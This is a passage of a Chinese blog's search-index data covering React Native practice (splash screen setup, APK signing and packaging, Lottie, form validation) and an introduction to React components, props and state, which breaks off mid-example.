在\u0026lt;application\u0026gt;标签内添加以下活动。\n\u0026lt;activity\randroid:name=\u0026#34;.SplashActivity\u0026#34;\randroid:theme=\u0026#34;@style/SplashTheme\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\r\u0026gt;\r\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34; /\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r\u0026lt;/activity\u0026gt; 从MainActivity标签中删除以下意图。\n\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34; /\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt; 并添加android:exported=\u0026quot;true\u0026quot;该活动。 现在，您的AndroidManifest.xml应该如下所示：\n\u0026lt;manifest xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\rpackage=\u0026#34;com.packagename\u0026#34;\u0026gt;\r\u0026lt;uses-permission android:name=\u0026#34;android.permission.INTERNET\u0026#34; /\u0026gt;\r\u0026lt;application\randroid:name=\u0026#34;.MainApplication\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\randroid:icon=\u0026#34;@mipmap/ic_launcher\u0026#34;\randroid:roundIcon=\u0026#34;@mipmap/ic_launcher\u0026#34;\randroid:allowBackup=\u0026#34;false\u0026#34;\randroid:theme=\u0026#34;@style/AppTheme\u0026#34;\u0026gt;\r\u0026lt;activity\randroid:name=\u0026#34;.SplashActivity\u0026#34;\randroid:theme=\u0026#34;@style/SplashTheme\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\r\u0026gt;\r\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34; /\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r\u0026lt;/activity\u0026gt;\r\u0026lt;activity\randroid:name=\u0026#34;.MainActivity\u0026#34;\randroid:label=\u0026#34;@string/app_name\u0026#34;\randroid:configChanges=\u0026#34;keyboard|keyboardHidden|orientation|screenSize|uiMode\u0026#34;\randroid:launchMode=\u0026#34;singleTask\u0026#34;\randroid:windowSoftInputMode=\u0026#34;adjustResize\u0026#34;\randroid:exported=\u0026#34;true\u0026#34;\r\u0026gt;\r\u0026lt;/activity\u0026gt;\r\u0026lt;activity android:name=\u0026#34;com.facebook.react.devsupport.DevSettingsActivity\u0026#34; /\u0026gt;\r\u0026lt;/application\u0026gt;\r\u0026lt;/manifest\u0026gt; Step3. 现在，我们将声明SplashThemefor SplashActivity。转到app/src/main/res/values/styles.xml并在\u0026lt;resources\u0026gt;中添加以下样式。\n\u0026lt;style name=\u0026#34;SplashTheme\u0026#34; parent=\u0026#34;Theme.AppCompat.Light.NoActionBar\u0026#34;\u0026gt;\r\u0026lt;item name=\u0026#34;android:background\u0026#34;\u0026gt;@drawable/background_splash\u0026lt;/item\u0026gt;\r\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@color/background\u0026lt;/item\u0026gt;\r\u0026lt;/style\u0026gt; Step4. 转到android\\app\\src\\main\\res\\values并创建一个文件（colors.xml如果尚不存在）。 我们在上面使用了背景颜色常量，因此必须将其添加到colors.xml文件中。\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;resources\u0026gt;\r\u0026lt;!-- Insert your background color for the splash screen --\u0026gt;\r\u0026lt;color name=\u0026#34;background\u0026#34;\u0026gt;#fff\u0026lt;/color\u0026gt;\r\u0026lt;/resources\u0026gt; Step5. 转到android/app/src/main/res/drawable（如果尚不存在，则创建drawable文件夹）并将您的启动屏幕图像（名称应为splash_screen.png）放在此处，并background_splash.xml使用以下代码创建文件：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;layer-list xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\u0026gt;\r\u0026lt;item android:drawable=\u0026#34;@color/background\u0026#34; /\u0026gt;\r\u0026lt;item\randroid:drawable=\u0026#34;@drawable/splash_screen\u0026#34;\randroid:height=\u0026#34;300dp\u0026#34;\randroid:width=\u0026#34;300dp\u0026#34;\randroid:gravity=\u0026#34;center\u0026#34;\r/\u0026gt;\r\u0026lt;/layer-list\u0026gt; 如果您的初始屏幕的尺寸是等于设备屏幕的尺寸，在\u0026lt;item\u0026gt;标签中删除android:height和android:width。\nStep6. react-native-splash-screen在您的项目中安装模块，然后SplashScreen从 App.js 文件中导入它。 import SplashScreen from 'react-native-splash-screen'; 我们只需要显示初始屏幕，直到安装第一个组件，然后useEffect在 App 组件主体内（返回之前）制作一个钩子，如下所示： 不要忘了import useEffect from 'react'。\nuseEffect(() =\u0026gt; {\rSplashScreen.hide();\r}, []); Step7. 转到app/src/main/java/[packageName]/MainActivity.java并导入以下模块，然后导入其他模块。\nimport org.devio.rn.splashscreen.SplashScreen;\rimport android.os.Bundle; 将此方法添加到MainActivity类的顶部。\n@Override\rprotected void onCreate(Bundle savedInstanceState) {\rSplashScreen.show(this, R.style.SplashStatusBarTheme);\rsuper.onCreate(savedInstanceState);\r} Step8. 去android/app/src/main/res/values/styles.xml添加SplashStatusBarTheme，就像我们在第 3 步一样。\n\u0026lt;style name=\u0026#34;SplashStatusBarTheme\u0026#34; parent=\u0026#34;SplashScreen_SplashTheme\u0026#34;\u0026gt;\r\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@color/background\u0026lt;/item\u0026gt;\r\u0026lt;/style\u0026gt; 如果不这样做，则在加载应用程序的 JS 代码时，StatusBar 的颜色将变为黑色。\nStep9. 转到android/app/src/main/res/并创建一个新文件夹layout（如果尚不存在）。在该文件夹中，创建一个文件launch_screen.xml（，需要此文件react-native-splash-screen library）。在该文件内，使用以前创建的背景创建布局，如下所示：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\randroid:orientation=\u0026#34;vertical\u0026#34;\randroid:layout_width=\u0026#34;match_parent\u0026#34;\randroid:layout_height=\u0026#34;match_parent\u0026#34;\randroid:background=\u0026#34;@drawable/background_splash\u0026#34;\r/\u0026gt; Step10. ·android/app/src/main/res/values/colors.xml·像在步骤 4 中一样转到并添加以下标签，否则，该应用程序将崩溃。不要更改颜色值。\n\u0026lt;color name=\u0026#34;primary_dark\u0026#34;\u0026gt;#000\u0026lt;/color\u0026gt; 四、ReactNative 签名打包 apk(android)  step1. 生成一个签名密钥\n C:\\Program Files\\Java\\jdk1.8.0_271\\bin 目录中，执行\nkeytool -genkeypair -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000 生成 my-release-key.keystore 密钥库文件\n Step2. 设置 gradle 变量\n 1.把 my-release-key.keystore 文件放到你工程中的 android/app 文件夹下。 2.编辑项目目录 /android/gradle.properties 如果没有 gradle.properties 文件你就自己创建一个，添加如下的代码（注意把其中的**替换为相应密码）\nMYAPP_RELEASE_STORE_FILE=my-release-key.keystore\rMYAPP_RELEASE_KEY_ALIAS=my-key-alias\rMYAPP_RELEASE_STORE_PASSWORD=*****\rMYAPP_RELEASE_KEY_PASSWORD=*****  Step3. 把签名配置加入到项目的 android/app/build.gradle 配置中\n ...\randroid {\r...\rdefaultConfig { ... }\rsigningConfigs {\r+ release {\rif (project.hasProperty(\u0026#39;MYAPP_RELEASE_STORE_FILE\u0026#39;)) {\rstoreFile file(MYAPP_RELEASE_STORE_FILE)\rstorePassword MYAPP_RELEASE_STORE_PASSWORD\rkeyAlias MYAPP_RELEASE_KEY_ALIAS\rkeyPassword MYAPP_RELEASE_KEY_PASSWORD\r}\r}\r}\rbuildTypes {\rrelease {\r...\r+ signingConfig signingConfigs.release\r}\r}\r}\r...  step4. 生成发行 APK 包\n 项目 android 目录中，执行\ngradlew assembleRelease //cmd 或者\r./gradlew assembleRelease //PowerShell 生成的 APK 文件位于 android/app/build/outputs/apk/release/app-release.apk\n如果需要重新打包，需先删除 \\android\\app\\build\\outputs\\apk 中的 release 文件夹\n step5. 测试发行版本\n npx react-native run-android --variant=release 五、RN/Expo 渲染本地图片(资源)列表 由于 RN 中引用本地图片是用require，而 require 是运行时编译的，所以不能在 require 中添加变量。参考 Link\nStep1. 将所需要的本地图片 Require 到一处\nconst image1 = require(\u0026#39;../assets/Image1.png\u0026#39;)\rconst image2 = require(\u0026#39;../assets/Image2.png\u0026#39;) Step2. 创建一个数组对象\nconst data = [\r{\u0026#34;id\u0026#34;:1, \u0026#34;url\u0026#34;: image1},\r{\u0026#34;id\u0026#34;:2, \u0026#34;url\u0026#34;: image2}\r] Step3. 这样就可以使用 map 渲染 data 数据并正确使用本地图片了\nconst listItems = data.map(item =\u0026gt;\r\u0026lt;View key={item.id}\u0026gt;\r\u0026lt;Image source={item.url} /\u0026gt;\r\u0026lt;/View\u0026gt;\r) 六、Lottie（lottie-react-native） Lottie是以json格式导出的Adobe After Effects动画库，并在移动设备和Web上渲染。\n本文只介绍RN安卓端的配置。\n一. 安装 （React Native \u0026gt;= 0.60.0）\nyarn add lottie-react-native 二. 配置文件（如果应用在Android上崩溃，则表示自动链接无效。才需要进行以下配置：）\n//1. android/app/src/main/java/\u0026lt;AppName\u0026gt;/MainApplication.java\r// 在文件入口（头部），添加\rimport com.airbnb.android.react.lottie.LottiePackage;\r// 在List \u0026lt;ReactPackage\u0026gt; getPackages()中，添加\rpackages.add(new LottiePackage());\r//2. android/app/build.gradle\r// 在 dependencies 块中，添加\rimplementation project(\u0026#39;:lottie-react-native\u0026#39;)\r//3. android/settings.gradle\rinclude \u0026#39;:lottie-react-native\u0026#39;\rproject(\u0026#39;:lottie-react-native\u0026#39;).projectDir = new File(rootProject.projectDir, \u0026#39;../node_modules/lottie-react-native/src/android\u0026#39;) 三. 使用\nimport React from \u0026#39;react\u0026#39;;\rimport LottieView from \u0026#39;lottie-react-native\u0026#39;;\rexport default class BasicExample extends React.Component {\rrender() {\rreturn \u0026lt;LottieView source={require(\u0026#39;./assets/my.json\u0026#39;)} autoPlay loop /\u0026gt;;\r}\r} // 其中，assets 是手动在项目根目录中创建的文件夹，这里的my.json即是lottie动画文件\n动画文件：lottiefiles\n四. 安装完新依赖/新添文件后需要重新编译到安卓设备中，yarn android\n七、RN表单验证 这里纯手写，当然也可以使用react-hooks-form等第三方库。 注意：select 的处理方式\nimport React, { Component } from \u0026#34;react\u0026#34;;\rimport { StyleSheet, KeyboardAvoidingView, TouchableWithoutFeedback, Keyboard } from \u0026#34;react-native\u0026#34;;\rimport { Layout, Input, Button, Select, SelectItem, IndexPath } from \u0026#34;@ui-kitten/components\u0026#34;;\rconst validEmailRegex = RegExp(\r/^(([^\u0026lt;\u0026gt;()\\[\\]\\.,;:\\s@\\\u0026#34;]+(\\.[^\u0026lt;\u0026gt;()\\[\\]\\.,;:\\s@\\\u0026#34;]+)*)|(\\\u0026#34;.+\\\u0026#34;))@(([^\u0026lt;\u0026gt;()[\\]\\.,;:\\s@\\\u0026#34;]+\\.)+[^\u0026lt;\u0026gt;()[\\]\\.,;:\\s@\\\u0026#34;]{2,})$/i\r);\rconst validateForm = errors =\u0026gt; {\rlet valid = true;\rObject.values(errors).forEach(val =\u0026gt; val.length \u0026gt; 0 \u0026amp;\u0026amp; (valid = false));\rreturn valid;\r};\rconst data = [//1.select初始数据\r\u0026#39;A\u0026#39;,\r\u0026#39;B\u0026#39;,\r\u0026#39;C\u0026#39;,\r];\rexport default class FormComponent extends Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rselectedIndex: new IndexPath(0),//2.select初始选中\rfullName: null,\remail: null,\rpassword: null,\rerrors: {\rfullName: \u0026#34;\u0026#34;,\remail: \u0026#34;\u0026#34;,\rpassword: \u0026#34;\u0026#34;\r}\r};\r}\rhandlePress = () =\u0026gt; {\rif (this.isNotEmpty()) {\rif (validateForm(this.state.errors)) {\rKeyboard.dismiss();\r// alert(\u0026#34;Created successfully.\u0026#34;);\rconst postData = {\r\u0026#34;typeFeedBack\u0026#34;:data[this.state.selectedIndex.row],//3.select选中数据\r}\rconsole.log(postData)\r}\r} else {\rvalidateForm(this.state.errors);\r}\r};\rhandleChange = (field, value) =\u0026gt; {\rlet errors = this.state.errors;\rswitch (field) {\rcase \u0026#34;fullName\u0026#34;:\rerrors.fullName = value.length \u0026lt; 5 ? \u0026#34;Full Name must be 5 characters long!\u0026#34; : \u0026#34;\u0026#34;;\rbreak;\rcase \u0026#34;email\u0026#34;:\rerrors.email = validEmailRegex.test(value) ? \u0026#34;\u0026#34; : \u0026#34;Email is not valid!\u0026#34;;\rbreak;\rcase \u0026#34;password\u0026#34;:\rerrors.password = value.length \u0026lt; 8 ? \u0026#34;Password must be 8 characters long!\u0026#34; : \u0026#34;\u0026#34;;\rbreak;\rdefault:\rbreak;\r}\rthis.setState({ errors, [field]: value });\r};\risNotEmpty = () =\u0026gt; {\rconst { fullName, email, password } = this.state;\rlet isNoError = true;\rif (!fullName) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\rfullName: \u0026#34;Full Name is required.\u0026#34;\r}\r}));\risNoError = false;\r}\rif (!email) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\remail: \u0026#34;Email Address is required.\u0026#34;\r}\r}));\risNoError = false;\r}\rif (!password) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\rpassword: \u0026#34;Password is required.\u0026#34;\r}\r}));\risNoError = false;\r}\rreturn isNoError;\r};\rrender() {\rconst { selectedIndex, fullName, email, password, errors } = this.state;\rconst displayValue = data[selectedIndex.row];//4.select选中的值\rconst renderOption = (title: string, index: number) =\u0026gt; (//5.select option\r\u0026lt;SelectItem key={index} title={title} /\u0026gt;\r);\rreturn (\r\u0026lt;KeyboardAvoidingView behavior=\u0026#34;padding\u0026#34; style={{ flex: 1 }}\u0026gt;\r\u0026lt;TouchableWithoutFeedback onPress={() =\u0026gt; Keyboard.dismiss()}\u0026gt;\r\u0026lt;Layout style={styles.container}\u0026gt;\r\u0026lt;Select //6. select组件渲染\rselectedIndex={selectedIndex}\ronSelect={(index) =\u0026gt; this.setState({ selectedIndex: index })}\rvalue={displayValue}\r\u0026gt;\r{data.map(renderOption)}\r\u0026lt;/Select\u0026gt;\r\u0026lt;Input\rvalue={fullName}\rlabel=\u0026#34;Full Name\u0026#34;\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.fullName.length \u0026gt; 0 \u0026amp;\u0026amp; errors.fullName}\rstatus={errors.fullName.length \u0026gt; 0 ? \u0026#34;danger\u0026#34; : \u0026#34;\u0026#34;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026#34;fullName\u0026#34;, value)}\r/\u0026gt;\r\u0026lt;Input\rvalue={email}\rlabel=\u0026#34;Email Address\u0026#34;\rkeyboardType=\u0026#34;email-address\u0026#34;\rautoCapitalize=\u0026#34;none\u0026#34;\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.email.length \u0026gt; 0 \u0026amp;\u0026amp; errors.email}\rstatus={errors.email.length \u0026gt; 0 ? \u0026#34;danger\u0026#34; : \u0026#34;\u0026#34;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026#34;email\u0026#34;, value)}\r/\u0026gt;\r\u0026lt;Input\rvalue={password}\rlabel=\u0026#34;Password\u0026#34;\rsecureTextEntry\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.password.length \u0026gt; 0 \u0026amp;\u0026amp; errors.password}\rstatus={errors.password.length \u0026gt; 0 ? \u0026#34;danger\u0026#34; : \u0026#34;\u0026#34;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026#34;password\u0026#34;, value)}\r/\u0026gt;\r\u0026lt;Button style={styles.btn} onPress={this.handlePress}\u0026gt;\rSubmit\r\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/TouchableWithoutFeedback\u0026gt;\r\u0026lt;/KeyboardAvoidingView\u0026gt;\r);\r}\r}\rconst styles = StyleSheet.create({\rcontainer: {\rflex: 1,\rjustifyContent: \u0026#34;center\u0026#34;,\rpaddingHorizontal: 10,\rwidth: 600\r},\rcaptionTextStyle: {\rcolor: \u0026#34;red\u0026#34;\r},\rbtn: {\rmarginVertical: 5\r}\r}); react-hooks-form 使用示例（包含select） import React from \u0026#34;react\u0026#34;;\rimport { StyleSheet } from \u0026#34;react-native\u0026#34;;\rimport { Layout, Input, Button, Select, SelectItem, IndexPath, Text } from \u0026#34;@ui-kitten/components\u0026#34;;\rimport { useForm, Controller } from \u0026#34;react-hook-form\u0026#34;;\rconst selectData = [\r\u0026#39;A\u0026#39;,\r\u0026#39;B\u0026#39;,\r\u0026#39;C\u0026#39;,\r];\rexport default function FormComponent() {\rconst { control, handleSubmit, errors } = useForm();\rconst onSubmit = (data: any) =\u0026gt; {\rconst postData = {\r\u0026#34;typeFeedBack\u0026#34;: displayValue,//select选的值\r\u0026#34;firstName\u0026#34;: data.firstName,\r\u0026#34;lastName\u0026#34;: data.lastName\r}\rconsole.log(postData)\r};\rconst [selectedIndex, setSelectedIndex] = React.useState(new IndexPath(0));\rconst displayValue = selectData[selectedIndex.row];\rconst renderOption = (title: string, index: number) =\u0026gt; (\r\u0026lt;SelectItem key={index} title={title} /\u0026gt;\r);\rreturn (\r\u0026lt;Layout style={styles.container} level=\u0026#39;4\u0026#39;\u0026gt;\r\u0026lt;Controller\rcontrol={control}\rrender={() =\u0026gt; (\r\u0026lt;Select\rstyle={styles.input}\rplaceholder=\u0026#39;Default\u0026#39;\rvalue={displayValue}\rselectedIndex={selectedIndex}\ronSelect={index =\u0026gt; setSelectedIndex(index)}\u0026gt;\r{selectData.map(renderOption)}\r\u0026lt;/Select\u0026gt;\r)}\rname=\u0026#34;typeFeedBack\u0026#34;//这里这个名字不重要，只要随便取一个没有的就可以。因为select我要单独处理\rdefaultValue=\u0026#34;\u0026#34;//必须，可以为空\r/\u0026gt;\r\u0026lt;Controller\rcontrol={control}\rrender={({ onChange, onBlur, value }) =\u0026gt; (\r\u0026lt;Input\rstyle={styles.input}\rlabel=\u0026#39;姓氏\u0026#39;\ronBlur={onBlur}\ronChangeText={value =\u0026gt; onChange(value)}\rvalue={value}\r/\u0026gt;\r)}\rname=\u0026#34;firstName\u0026#34;\rrules={{ required: true }}\rdefaultValue=\u0026#34;\u0026#34;\r/\u0026gt;\r{errors.firstName \u0026amp;\u0026amp; \u0026lt;Text\u0026gt;This is required.\u0026lt;/Text\u0026gt;}\r\u0026lt;Controller\rcontrol={control}\rrender={({ onChange, onBlur, value }) =\u0026gt; (\r\u0026lt;Input\rstyle={styles.input}\rlabel=\u0026#39;名字\u0026#39;\ronBlur={onBlur}\ronChangeText={value =\u0026gt; onChange(value)}\rvalue={value}\r/\u0026gt;\r)}\rname=\u0026#34;lastName\u0026#34;\rrules={{ required: true }}\rdefaultValue=\u0026#34;\u0026#34;\r/\u0026gt;\r{errors.lastName \u0026amp;\u0026amp; \u0026lt;Text\u0026gt;This is required.\u0026lt;/Text\u0026gt;}\r\u0026lt;Button style={styles.button} onPress={handleSubmit(onSubmit)}\u0026gt;提交\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r);\r}\rconst styles = StyleSheet.create({\rcontainer: {\rpaddingLeft: 20,\rpaddingRight: 20,\rpaddingBottom: 20\r},\rinput: {\rwidth: 500,\rmarginTop: 20\r},\rbutton: {\rmarginTop: 20\r}\r}) ","description":"","id":42,"section":"react-native","tags":null,"title":"React-Native 最佳实践","uri":"https://codthing.github.io/react-native/react-native/rn-bp/"},{"content":"React 简介 多年来，对使用 JavaScript 编写用户界面的直接方法的需求不断增加。 React，也称为 React.js，是 Facebook 设计的开源 JavaScript 库，用于构建用户界面或 UI 组件。\nReact 当然不是唯一的 UI 库。 Preact、Vue、Angular、Svelte、Lit 和许多其他工具也非常适合从可重用元素组合界面。\n鉴于 React 的受欢迎程度，考虑到我们将使用它来了解本指南中的一些设计、渲染和性能模式，因此有必要了解它的工作原理。\n当前端开发人员谈论代码时，通常是在为 Web 设计界面的上下文中。我们认为界面组合的方式是元素，如按钮、列表、导航等。 React 提供了一种优化和简化的方式来表达这些元素中的接口。它还通过将您的界面组织成三个关键概念——组件、道具和状态，帮助构建复杂和棘手的界面。\n因为 React 以组合为中心，所以它可以完美地映射到设计系统的元素。\n所以，本质上，为 React 设计实际上是在鼓励你以模块化的方式思考。\n它允许您在组合页面或视图之前设计单独的组件，因此可以完全了解每个组件的范围和目的——这个过程称为组件化。\n\r术语   React / React.js / ReactJS - React 库，由 Facebook 于 2013 年创建\n  ReactDOM - 用于 DOM 和服务器渲染的包\n  JSX - JavaScript 的语法扩展\n  Redux - 集中状态容器\n  Hooks - 一种无需编写类即可使用状态和其他 React 功能的新方法\n  ReactNative - 使用 Javascript 开发跨平台本机应用程序的库\n  Webpack - 在 React 社区中流行的 JavaScript 模块捆绑器。\n  CRA（创建 React 应用程序）- 一种 CLI 工具，用于创建用于引导项目的脚手架 React 应用程序。\n  Next.js - 一个 React 框架，具有许多一流的功能，包括 SSR、代码拆分、性能优化等。\n  \r使用 JSX 渲染 我们将在许多示例中使用 JSX。\nJSX 是 JavaScript 的扩展，它使用类似 XML 的语法将模板 HTML 嵌入到 JS 中。\n它旨在转换为有效的 JavaScript，尽管该转换的语义是特定于实现的。\nJSX 在 React 库中越来越受欢迎，但此后也出现了其他实现。\n\rComponents, Props, State 组件、道具和状态是 React 中的三个关键概念。\n实际上，在 React 中看到或做的所有事情都可以归类为这些关键概念中的至少一个，以下是这些关键概念的快速浏览：\n1. Components 组件是任何 React 应用程序的构建块。 它们就像 JavaScript 函数，接受任意输入（Props） 并返回描述应该在屏幕上显示的内容的 React 元素。\n首先要理解的是，React 应用程序屏幕上的所有内容都是组件的一部分。 从本质上讲，React 应用程序只是组件内组件中的组件。 所以开发者不用在 React 中构建页面； 他们构建组件。\n组件可让您将 UI 拆分为独立的、可重用的部分。 如果您习惯于设计页面，那么以这种模块化方式思考似乎是一个很大的变化。 但是如果你使用设计系统或风格指南呢？ 那么这可能不像看起来那么大的范式转变。\n定义组件最直接的方式是编写 JavaScript 函数。\nfunction Badge(props) {\rreturn \u0026lt;h1\u0026gt;Hello, my name is {props.name}\u0026lt;/h1\u0026gt;;\r} 这个函数是一个有效的 React 组件，因为它接受带有数据的单个 prop（代表属性）对象参数并返回一个 React 元素。 此类组件称为“函数组件”，因为它们实际上是 JavaScript 函数。\n除了功能组件，另一种类型的组件是“类组件”。 类组件与函数组件的不同之处在于它是由 ES6 class 定义的，如下所示：\nclass Badge extends React.Component {\rrender() {\rreturn \u0026lt;h1\u0026gt;Hello, my name is {this.props.name}\u0026lt;/h1\u0026gt;;\r}\r} 提取组件\n为了说明组件可以拆分为更小的组件这一事实，请考虑以下 Tweet 组件：\n可以按如下方式实现：\nfunction Tweet(props) {\rreturn (\r\u0026lt;div className=\u0026#34;Tweet\u0026#34;\u0026gt;\r\u0026lt;div className=\u0026#34;User\u0026#34;\u0026gt;\r\u0026lt;img className=\u0026#34;Avatar\u0026#34;\rsrc={props.author.avatarUrl}\ralt={props.author.name}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;User-name\u0026#34;\u0026gt;\r{props.author.name}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-text\u0026#34;\u0026gt;\r{props.text}\r\u0026lt;/div\u0026gt;\r\u0026lt;img className=\u0026#34;Tweet-image\u0026#34;\rsrc={props.image.imageUrl}\ralt={props.image.description}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-date\u0026#34;\u0026gt;\r{formatDate(props.date)}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 这个组件可能有点难以操作，因为它是多么的集群，并且重用它的各个部分也很困难。 但是，我们仍然可以从中提取一些组件。\n我们要做的第一件事是提取头像：\nfunction Avatar(props) {\rreturn (\r\u0026lt;img className=\u0026#34;Avatar\u0026#34;\rsrc={props.user.avatarUrl}\ralt={props.user.name}\r/\u0026gt;\r);\r} Avatar 不需要知道它是在 Comment 中呈现的。 这就是为什么我们给它的道具一个更通用的名字：用户而不是作者。\n现在我们将注释简化一点：\nfunction Tweet(props) {\rreturn (\r\u0026lt;div className=\u0026#34;Tweet\u0026#34;\u0026gt;\r\u0026lt;div className=\u0026#34;User\u0026#34;\u0026gt;\r\u0026lt;Avatar user={props.author} /\u0026gt;\r\u0026lt;div className=\u0026#34;User-name\u0026#34;\u0026gt;\r{props.author.name}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-text\u0026#34;\u0026gt;\r{props.text}\r\u0026lt;/div\u0026gt;\r\u0026lt;img className=\u0026#34;Tweet-image\u0026#34;\rsrc={props.image.imageUrl}\ralt={props.image.description}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-date\u0026#34;\u0026gt;\r{formatDate(props.date)}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 接下来我们要做的是一个 User 组件，它在用户名的旁边呈现一个_头像_：\nfunction User(props) {\rreturn (\r\u0026lt;div className=\u0026#34;User\u0026#34;\u0026gt;\r\u0026lt;Avatar user={props.user} /\u0026gt;\r\u0026lt;div className=\u0026#34;User-name\u0026#34;\u0026gt;\r{props.user.name}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 现在我们将进一步简化 Tweet：\nfunction Tweet(props) {\rreturn (\r\u0026lt;div className=\u0026#34;Tweet\u0026#34;\u0026gt;\r\u0026lt;User user={props.author} /\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-text\u0026#34;\u0026gt;\r{props.text}\r\u0026lt;/div\u0026gt;\r\u0026lt;img className=\u0026#34;Tweet-image\u0026#34;\rsrc={props.image.imageUrl}\ralt={props.image.description}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-date\u0026#34;\u0026gt;\r{formatDate(props.date)}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 提取组件似乎是一项乏味的工作，但是在为大型应用程序编码时，拥有可重用的组件会使事情变得更容易。 简化组件时要考虑的一个很好的标准是：\n如果 UI 的一部分被多次使用（按钮、面板、头像），或者它本身足够复杂（应用程序、FeedStory、评论），那么它是一个很好的候选者 被提取到一个单独的组件。\n2. Props Props 是属性的缩写形式，它们只是指 React 中组件的内部数据。 它们写在组件调用中并传递到组件中。 它们还使用与 HTML 属性相同的语法，例如 _ prop=\u0026ldquo;value\u0026rdquo;。\n关于道具值得记住的两件事:\n 首先，在构建组件之前确定 prop 的值并将其用作蓝图的一部分。 其次，prop 的值永远不会改变，即 props 一旦被传递到组件中就是只读的。  访问 prop 的方式是通过每个组件都可以访问的“this.props”属性来引用它。\n3. State State 是一个对象，它包含一些可能在组件的生命周期内发生变化的信息。\n这意味着它只是存储在组件 Props 中的数据的当前快照。\n数据会随着时间的推移而变化，因此管理数据变化方式的技术变得必要，以确保组件在恰当的时间看起来像工程师希望的那样——这称为状态管理。\n几乎不可能在不了解状态管理的情况下阅读一段关于 React 的内容。\n开发人员喜欢阐述这个主题，但在其核心，状态管理并不像听起来那么复杂。\n在 React 中，还可以全局跟踪状态，并且可以根据需要在组件之间共享数据。\n本质上，这意味着在 React 应用程序中，在新位置加载数据并不像使用其他技术那样昂贵。 React 应用程序在保存和加载哪些数据以及何时加载方面更加智能。这为制作以新方式使用数据的界面提供了机会。\n想想 React 组件，比如具有自己的数据、逻辑和表示的微应用程序。\n每个组件都应该有一个单一的目的。作为一名工程师，您可以决定该目的并完全控制每个组件的行为方式和使用的数据。\n您不再受页面其余部分数据的限制。在您的设计中，您可以通过各种方式利用这一点。有机会展示可以改善用户体验或使设计中的区域更具上下文的附加数据。\n如何在 React 中添加 State\n在设计时，包括 State 是您应该放到任务的最后。 使用 props 和 events 将所有东西设计得尽可能无状态要好得多。 这使得组件更易于维护、测试和理解。\n添加状态应该通过 Redux 和 MobX 等状态容器或容器/包装器组件来完成。\nRedux 是其他反应式框架的流行状态管理系统。 它实现了一个由动作驱动的集中状态机。\n在下面的示例中，状态的位置可以是 LoginContainer 本身。 让我们为此使用 React Hooks（这将在下一节中讨论）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  const LoginContainer = () =\u0026gt; { const [username, setUsername] = useState(\u0026#34;\u0026#34;); const [password, setPassword] = useState(\u0026#34;\u0026#34;); const login = async event =\u0026gt; { event.preventDefault(); const response = await fetch(\u0026#34;/api\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: JSON.stringify({ username, password, }), }); // 在这里我们可以检查 response.status 登录或显示错误  }; return ( \u0026lt;LoginForm onSubmit={login}\u0026gt; \u0026lt;FormInput name=\u0026#34;username\u0026#34; title=\u0026#34;Username\u0026#34; onChange={event =\u0026gt; setUsername(event.currentTarget.value)} value={username} /\u0026gt; \u0026lt;FormPasswordInput name=\u0026#34;password\u0026#34; title=\u0026#34;Password\u0026#34; onChange={event =\u0026gt; 